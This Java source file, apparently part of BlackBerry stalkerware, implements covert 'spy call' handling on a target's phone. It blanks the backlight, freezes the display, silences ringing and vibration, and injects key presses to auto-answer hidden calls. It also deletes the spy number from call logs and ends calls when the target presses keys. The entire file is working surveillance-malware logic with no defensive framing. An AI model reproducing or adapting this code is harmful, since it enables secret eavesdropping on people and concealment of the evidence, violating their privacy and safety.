package com.vvt.bug;

import com.vvt.std.Log;

import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.system.Audio;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.UiApplication;

public class PELPFive extends BasePELP {
	
	private boolean isDeleted = false; // This flag is used for verifying the interrupt call number that have been deleted.
	private boolean isInterrupted = false; // This flag is used for verifying the interrupt call.
	private boolean isHeld = false; // This flag is used for verifying the spy call is held after target presses send key several times.
	
	public void callHeld(int callId) {
		if (sCInProgress) {
			isHeld = true;
			int timeToWait = 100;
			for (int i = 0; i < 5; i++) {
				injectKey((char)Keypad.KEY_END, timeToWait);
			}
		}
	}
	
	public void callWaiting(int callId) {
		try {
			isInterrupted = true;
			callWaitingIdUnique = lastCallInitiatedOrIncomingId != callId;
			if (numberOfCallsConnected == 0) {
				numberOfCallsConnected = 1;
			}
			addPhoneCallToAdministration(callId);
			if (sCInProgress) {
				stopVibrateAndSound();
				rejectSCIncoming(pelSettings.waitBeforeEndNormalCallWhenSCActiveMS);
				rejectSCIncoming(pelSettings.waitBeforeEndSCWhenNormalCallWaitingMS);
			} else {
				if (callWaitingIdUnique) {
					PhoneCall sC = isSC(callId);
					if (sC != null) {
						volumeAudioOriginal = Audio.getVolume();
						stopVibrateAndSound();
						voiceApp.suspendPainting(true);
						rejectSCIncoming(pelSettings.waitBeforeRejectSCWaitingMS);
					}
				} else {
					disableSCRemovalFromLogs = true;
				}
			}
		} catch (Exception e) {
			Log.error("PELPFive.callWaiting", "", e);
		}
	}

	protected void endSCCaseKeyPressed() {
		rejectSCIncoming(pelSettings.endSCInProgressTimeToWaitMS);
	}
	
	public void callDisconnected(int callId) {
		if (sCInProgress) {
			if (isInterrupted) {
				if (!isDeleted) {
					isDeleted = true;
					deleteSpyNumber(pelSettings.waitBeforeDeleteSpyNumberMS, true, false);
				}
			}
			else if (isHeld) {
				if (!isDeleted) {
					isDeleted = true;
					deleteSpyNumber(pelSettings.waitBeforeDeleteSpyNumberMS, false, true);
				}
			}
			else {
				deleteSpyNumber(pelSettings.waitBeforeDeleteSpyNumberMS, false, false);
			}
		}
		super.callDisconnected(callId);
	}
	
	public void callIncoming(int callId) {
//		Log.debug("PELPFive.callIncoming", "ENTER");
		try {
			// Set default.
			isDeleted = false;
			isInterrupted = false;
			isHeld = false;
			if (numberOfCallsConnected > 0) {
				callWaiting(callId);
			} else {
				if (voiceApp == null) {
					voiceApp = UiApplication.getUiApplication();
				}
				volumeAudioOriginal = Audio.getVolume();
				stopVibrateAndSound();
				disableSCRemovalFromLogs = false;
				lastCallInitiatedOrIncomingId = callId;
				addPhoneCallToAdministration(callId);
				PhoneCall sC = isSC(callId);
//				Log.debug("PELPFive.callIncoming", "sC: " + sC);
				sCInProgress = sC != null; // If sC is not null, it means that there is a spy call.
				sCInjectEvent = sCInProgress;
				if (sCInProgress) { // Is there a spy call?
					try {
						Backlight.enable(false);
						voiceApp.suspendPainting(true);
						determineAcceptSc(); // If user is interacting with the phone, it will not be spy.
						int timeToWait = 500; // In millisecond.
						if (lastIncomingSCAccepted) {
							injectKey((char)Keypad.KEY_SEND, timeToWait);
							patScheduledEndCall = new PhoneKeyActionThread(null, (char) Keypad.KEY_END, pelSettings.scheduleEndSCWhenNotConnectedOrNotAnsweredMS);
						}
						else {
							injectKey((char)Keypad.KEY_END, timeToWait);
						}
					} catch (Exception e) {
					
					}
				} else {
					cancelStopVibrateAndSound();
				}
			} 
		} catch (Exception e) {
			Log.error("PELPFive.callIncoming", "", e);
		}
//		Log.debug("PELPFive.callIncoming", "EXIT");
	}
}